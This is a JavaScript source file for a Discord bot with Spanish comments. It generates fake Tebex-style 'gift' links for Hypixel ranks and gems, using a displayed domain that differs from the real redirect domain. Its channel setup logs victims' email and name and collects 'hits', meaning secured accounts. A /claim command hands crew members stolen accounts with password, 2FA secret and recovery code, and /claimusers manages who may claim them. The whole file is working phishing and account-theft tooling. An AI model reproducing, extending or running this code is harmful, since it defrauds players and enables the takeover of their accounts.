// Para guardar el canal configurado
let configuredChannelId = null;
let configuredChannelType = null;
// Discord bot for Tebex-style product links
// Requires: discord.js v14+, Node.js 16+
// 1. npm install discord.js dotenv
// 2. Set your bot token in a .env file as DISCORD_TOKEN=your_token_here

const { Client, GatewayIntentBits, SlashCommandBuilder, Routes, REST, InteractionType } = require('discord.js');
require('dotenv').config();

// Importar embed utilities
const { getVerificationEmbed, sendHitNotification } = require('./discord_embeds');

// Dominios y rutas configurables
const PRODUCT_DOMAIN = process.env.PRODUCT_DOMAIN; // Dominio que se muestra en los links
const PRODUCT_PATH = process.env.PRODUCT_PATH; // Path configurable después del dominio
const PRODUCT_URL_BASE = PRODUCT_DOMAIN + PRODUCT_PATH; // Ejemplo: https://midominio.local/checkout?gift=
const REDIRECT_URL_BASE = process.env.REDIRECT_URL_BASE; // Dominio real al que se redirige

// Función para generar un código aleatorio
function generateCode(length = 16) {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// Función para formatear el nombre del producto
function formatProductName(name) {
  if (name === 'MVP+ Rank') return 'mvpplus';
  if (name === 'MVP++ Rank') return 'mvpplusplus';
  if (name === 'VIP+ Rank') return 'vipplus';
  return name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
}
const PRODUCTS = [
  { id: 1, name: "16,400 SkyBlock Gems", price: "99.99" },
  { id: 2, name: "3,600 SkyBlock Gems", price: "24.99" },
  { id: 3, name: "11,000 Gold", price: "100.00" },
  { id: 4, name: "VIP Rank", price: "6.99" },
  { id: 5, name: "VIP+ Rank", price: "14.99" },
  { id: 6, name: "MVP Rank", price: "29.99" },
  { id: 7, name: "MVP+ Rank", price: "44.99" },
  { id: 8, name: "MVP++ Rank", price: "7.99" },
  { id: 9, name: "1,000 Gold", price: "9.99" },
  { id: 10, name: "2,500 Gold", price: "25.00" },
  { id: 11, name: "5,000 Gold", price: "50.00" },
  { id: 12, name: "11,000 Gold", price: "100.00" },
  { id: 13, name: "675 SkyBlock Gems", price: "4.99" },
  { id: 14, name: "1,390 SkyBlock Gems", price: "9.99" },
  { id: 15, name: "3,600 SkyBlock Gems", price: "24.99" },
  { id: 16, name: "7,200 SkyBlock Gems", price: "49.99" }
];

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
  // Autocomplete handler
  if (interaction.type === InteractionType.ApplicationCommandAutocomplete) {
    const focused = interaction.options.getFocused();
    const filtered = PRODUCTS.filter(p => p.name.toLowerCase().includes(focused.toLowerCase())).slice(0, 25);
    await interaction.respond(filtered.map(p => ({ name: p.name, value: p.id.toString() })));
    return;
  }
  // Command handler
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName === 'create') {
    const sub = interaction.options.getSubcommand();
    if (sub === 'link') {
      const productId = interaction.options.getString('product');
      if (!productId) {
        // Si no se seleccionó producto, mostrar todos los productos
        // Enviar un embed por cada producto
          const embeds = PRODUCTS.map(p => ({
            type: 'rich',
            title: '📋 Gift Link Created',
            color: 5793266,
            footer: { text: '⚡ ILJ Links - Soon 2.0' },
            fields: [
              { name: 'Product', value: p.name, inline: true },
              { name: 'Price', value: `$${p.price}`, inline: true },
              { name: 'Link', value: `${PRODUCT_URL_BASE}${formatProductName(p.name)}-${generateCode(16)}`, inline: false },
                        { name: 'Creado por', value: `<@${interaction.user.id}>`, inline: false }
            ]
          }));
        if (configuredChannelId && configuredChannelType === 'logs') {
          const channel = await interaction.guild.channels.fetch(configuredChannelId).catch(() => null);
          if (channel) {
            for (const embed of embeds) {
              await channel.send({ embeds: [embed] });
            }
            await interaction.reply({ content: `Links enviados a <#${configuredChannelId}>`, ephemeral: true });
          } else {
            await interaction.reply({ content: 'No se pudo encontrar el canal configurado.', ephemeral: true });
          }
        } else {
          for (const embed of embeds) {
            await interaction.user.send({ embeds: [embed] }).catch(() => {});
          }
          await interaction.reply({ content: 'Links enviados por DM.', ephemeral: true });
        }
        return;
      }
      const product = PRODUCTS.find(p => p.id.toString() === productId);
      if (!product) {
        await interaction.reply({ content: 'Producto no encontrado.', ephemeral: true });
        return;
      }
      const productUrl = `${PRODUCT_URL_BASE}${formatProductName(product.name)}-${generateCode(16)}`;
      // Crear embed personalizado para el producto
        const embed = {
          type: 'rich',
          title: '📋 Gift Link Created',
          color: 5793266,
          footer: { text: '⚡ ILJ Links - Soon 2.0' },
          fields: [
            { name: 'Product', value: product.name, inline: true },
            { name: 'Price', value: `$${product.price}`, inline: true },
            { name: 'Link', value: productUrl, inline: false },
                    { name: 'Creado por', value: `<@${interaction.user.id}>`, inline: false }
          ]
        };
      if (configuredChannelId && configuredChannelType === 'logs') {
        const channel = await interaction.guild.channels.fetch(configuredChannelId).catch(() => null);
        if (channel) {
          await channel.send({ embeds: [embed] });
          await interaction.reply({ content: `Link enviado a <#${configuredChannelId}>`, ephemeral: true });
        } else {
          await interaction.reply({ content: `No se pudo encontrar el canal configurado.`, ephemeral: true });
        }
      } else {
        await interaction.reply({ embeds: [embed], ephemeral: true });
      }
    }
  }
    if (interaction.commandName === 'claim') {
      const name = interaction.options.getString('name');
      const userId = interaction.user.id;
      
      try {
        // Check if user has permission to claim
        const ClaimPermissions = require('./claim_permissions');
        const claimPermissions = new ClaimPermissions();
        
        const canClaim = await claimPermissions.canClaim(userId);
        
        if (!canClaim) {
          const embed = {
            title: '🚫 Permiso Denegado',
            color: 15548997,
            description: 'No tienes permisos para reclamar cuentas',
            fields: [
              { name: '👤 Usuario', value: `<@${userId}>`, inline: true },
              { name: '🔑 Estado', value: '`❌ No permitido`', inline: true },
              { name: '💡 Ayuda', value: 'Contacta a un owner para obtener permisos', inline: false }
            ],
            footer: { text: '⚡ ILJ Links - Soon 2.0' }
          };
          
          await interaction.reply({ embeds: [embed], ephemeral: true });
          return;
        }
        
        const response = await fetch(`http://localhost:3000/api/claims/claim`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            fullName: name,
            userId: userId
          })
        });
        
        const result = await response.json();
        
        if (result.success) {
          const embed = {
            title: '🎁 Account Claimed Successfully',
            color: 5763713,
            description: `Has reclamado la cuenta de **${name}**`,
            fields: [
              { name: '📧 Email', value: `\`${result.account.email}\``, inline: false },
              { name: '🛡️ Security Email', value: `\`${result.account.secEmail}\``, inline: false },
              { name: '🔑 Password', value: `\`${result.account.password}\``, inline: false },
              { name: '📱 2FA', value: `\`${result.account.secretkey}\``, inline: false },
              { name: '♻️ Recovery Code', value: `\`${result.account.recoveryCode}\``, inline: false },
              { name: '📦 Product', value: `\`${result.account.product}\``, inline: true },
              { name: '🎮 Minecraft', value: `\`${result.account.minecraft}\``, inline: true }
            ],
            footer: { text: '⚡ ILJ Links - Soon 2.0' },
            timestamp: new Date().toISOString()
          };
          
          await interaction.reply({ embeds: [embed], ephemeral: true });
        } else {
          const embed = {
            title: '❌ Claim Failed',
            color: 15548997,
            description: result.error || 'No se pudo reclamar la cuenta',
            footer: { text: '⚡ ILJ Links - Soon 2.0' }
          };
          
          await interaction.reply({ embeds: [embed], ephemeral: true });
        }
      } catch (error) {
        console.error('Error claiming account:', error);
        await interaction.reply({ content: 'Error al reclamar la cuenta', ephemeral: true });
      }
    }
    if (interaction.commandName === 'claimusers') {
      const subcommand = interaction.options.getSubcommand();
      const userId = interaction.user.id;
      
      try {
        const ClaimPermissions = require('./claim_permissions');
        const claimPermissions = new ClaimPermissions();
        
        switch (subcommand) {
          case 'add':
            const addUser = interaction.options.getUser('user');
            const addResult = await claimPermissions.grantPermission(userId, addUser.id);
            
            if (addResult.success) {
              const embed = {
                title: '✅ Permiso Agregado',
                color: 5763713,
                description: `Se ha agregado permiso de claim a **${addUser.username}**`,
                fields: [
                  { name: '👤 Usuario', value: `<@${addUser.id}>`, inline: true },
                  { name: '🆔 ID', value: `\`${addUser.id}\``, inline: true },
                  { name: '👑 Agregado por', value: `<@${userId}>`, inline: false }
                ],
                footer: { text: '⚡ ILJ Links - Soon 2.0' },
                timestamp: new Date().toISOString()
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            } else {
              const embed = {
                title: '❌ Error al agregar permiso',
                color: 15548997,
                description: addResult.error || 'No se pudo agregar el permiso',
                footer: { text: '⚡ ILJ Links - Soon 2.0' }
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            }
            break;
            
          case 'remove':
            const removeUser = interaction.options.getUser('user');
            const removeResult = await claimPermissions.revokePermission(userId, removeUser.id);
            
            if (removeResult.success) {
              const embed = {
                title: '✅ Permiso Removido',
                color: 5763713,
                description: `Se ha removido el permiso de claim de **${removeUser.username}**`,
                fields: [
                  { name: '👤 Usuario', value: `<@${removeUser.id}>`, inline: true },
                  { name: '🆔 ID', value: `\`${removeUser.id}\``, inline: true },
                  { name: '👑 Removido por', value: `<@${userId}>`, inline: false }
                ],
                footer: { text: '⚡ ILJ Links - Soon 2.0' },
                timestamp: new Date().toISOString()
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            } else {
              const embed = {
                title: '❌ Error al remover permiso',
                color: 15548997,
                description: removeResult.error || 'No se pudo remover el permiso',
                footer: { text: '⚡ ILJ Links - Soon 2.0' }
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            }
            break;
            
          case 'list':
            const listResult = await claimPermissions.listPermissions(userId);
            
            if (listResult.success) {
              const permissions = listResult.permissions;
              
              if (permissions.length === 0) {
                const embed = {
                  title: '📋 Lista de Permisos',
                  color: 3447003,
                  description: 'No hay usuarios con permisos de claim',
                  footer: { text: '⚡ ILJ Links - Soon 2.0' },
                  timestamp: new Date().toISOString()
                };
                await interaction.reply({ embeds: [embed], ephemeral: true });
              } else {
                const embed = {
                  title: '📋 Lista de Permisos de Claim',
                  color: 3447003,
                  description: `**${permissions.length}** usuarios con permisos de claim`,
                  fields: permissions.map((perm, index) => ({
                    name: `${index + 1}. Usuario`,
                    value: `<@${perm.user_id}> (\`${perm.user_id}\`)\n👑 Por: <@${perm.granted_by}>\n📅 ${new Date(perm.granted_at).toLocaleString()}`,
                    inline: false
                  })),
                  footer: { text: '⚡ ILJ Links - Soon 2.0' },
                  timestamp: new Date().toISOString()
                };
                await interaction.reply({ embeds: [embed], ephemeral: true });
              }
            } else {
              const embed = {
                title: '❌ Error al listar permisos',
                color: 15548997,
                description: listResult.error || 'No se pudo listar los permisos',
                footer: { text: '⚡ ILJ Links - Soon 2.0' }
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            }
            break;
            
          case 'check':
            const checkUser = interaction.options.getUser('user') || interaction.user;
            const checkResult = await claimPermissions.getUserPermissions(checkUser.id);
            
            if (checkResult.success) {
              const permissions = checkResult.permissions;
              const hasPermission = permissions.length > 0 && permissions[0].has_permission === 1;
              
              const embed = {
                title: '🔍 Verificación de Permisos',
                color: hasPermission ? 5763713 : 15548997,
                description: `**${checkUser.username}** ${hasPermission ? '✅ TIENE' : '❌ NO TIENE'} permisos de claim`,
                fields: [
                  { name: '👤 Usuario', value: `<@${checkUser.id}>`, inline: true },
                  { name: '🆔 ID', value: `\`${checkUser.id}\``, inline: true },
                  { name: '🔑 Estado', value: hasPermission ? '`✅ Permitido`' : '`❌ No permitido`', inline: false }
                ],
                footer: { text: '⚡ ILJ Links - Soon 2.0' },
                timestamp: new Date().toISOString()
              };
              
              if (hasPermission && permissions[0].granted_by) {
                embed.fields.push({
                  name: '👑 Otorgado por',
                  value: `<@${permissions[0].granted_by}>`,
                  inline: false
                });
                embed.fields.push({
                  name: '📅 Fecha',
                  value: new Date(permissions[0].granted_at).toLocaleString(),
                  inline: false
                });
              }
              
              await interaction.reply({ embeds: [embed], ephemeral: true });
            } else {
              const embed = {
                title: '❌ Error al verificar permisos',
                color: 15548997,
                description: checkResult.error || 'No se pudo verificar los permisos',
                footer: { text: '⚡ ILJ Links - Soon 2.0' }
              };
              await interaction.reply({ embeds: [embed], ephemeral: true });
            }
            break;
        }
      } catch (error) {
        console.error('Error in claimusers command:', error);
        await interaction.reply({ content: 'Error al procesar el comando', ephemeral: true });
      }
    }
    if (interaction.commandName === 'setchannel') {
      const type = interaction.options.getString('type');
      const channel = interaction.options.getChannel('channel');
      if (!type || !channel) {
        await interaction.reply({ content: 'Debes seleccionar un tipo y un canal.', ephemeral: true });
        return;
      }
      configuredChannelId = channel.id;
      configuredChannelType = type;
      await interaction.reply({ content: `Canal configurado: <#${channel.id}>\nTipo: ${type}`, ephemeral: true });
      return;
    }
});

// Register slash command /create link with autocomplete
const commands = [
  new SlashCommandBuilder()
    .setName('create')
    .setDescription('Crear links de productos')
    .addSubcommand(sub =>
      sub.setName('link')
        .setDescription('Ver links de productos disponibles')
        .addStringOption(opt =>
          opt.setName('product')
            .setDescription('Product name')
            .setRequired(false)
            .setAutocomplete(true)
        )
    )
    .toJSON(),
  new SlashCommandBuilder()
    .setName('setchannel')
    .setDescription('Configura el canal para enviar los links')
    .addStringOption(opt =>
      opt.setName('type')
        .setDescription('Channel type')
        .setRequired(true)
        .addChoices(
          { name: 'Logs (email, name, zip)', value: 'logs' },
          { name: 'Hits (secured accounts)', value: 'hits' },
          { name: 'Claims (sub-user claims)', value: 'claims' }
        )
    )
    .addChannelOption(opt =>
      opt.setName('channel')
        .setDescription('Channel')
        .setRequired(true)
    )
    .toJSON(),
  new SlashCommandBuilder()
    .setName('claim')
    .setDescription('Reclamar una cuenta disponible')
    .addStringOption(opt =>
      opt.setName('name')
        .setDescription('Full name de la cuenta')
        .setRequired(true)
    )
    .toJSON(),
  new SlashCommandBuilder()
    .setName('claimusers')
    .setDescription('Gestionar permisos de claims (solo owners)')
    .addSubcommand(sub =>
      sub.setName('add')
        .setDescription('Agregar permiso de claim a un usuario')
        .addUserOption(opt =>
          opt.setName('user')
            .setDescription('Usuario a agregar')
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName('remove')
        .setDescription('Quitar permiso de claim a un usuario')
        .addUserOption(opt =>
          opt.setName('user')
            .setDescription('Usuario a quitar')
            .setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName('list')
        .setDescription('Listar usuarios con permisos de claim')
    )
    .addSubcommand(sub =>
      sub.setName('check')
        .setDescription('Ver permisos de un usuario')
        .addUserOption(opt =>
          opt.setName('user')
            .setDescription('Usuario a verificar')
            .setRequired(false)
        )
    )
    .toJSON()
];


// Debug: mostrar token y client id (solo primeros y últimos caracteres por seguridad)
console.log('DISCORD_TOKEN:', process.env.DISCORD_TOKEN ? process.env.DISCORD_TOKEN.slice(0, 5) + '...' + process.env.DISCORD_TOKEN.slice(-5) : 'undefined');
console.log('CLIENT_ID:', process.env.CLIENT_ID || 'undefined');

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

(async () => {
  try {
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log('Slash command registered.');
  } catch (error) {
    console.error(error);
  }
})();

client.login(process.env.DISCORD_TOKEN);
// Fin del archivo: todas las llaves y paréntesis están cerrados correctamente.
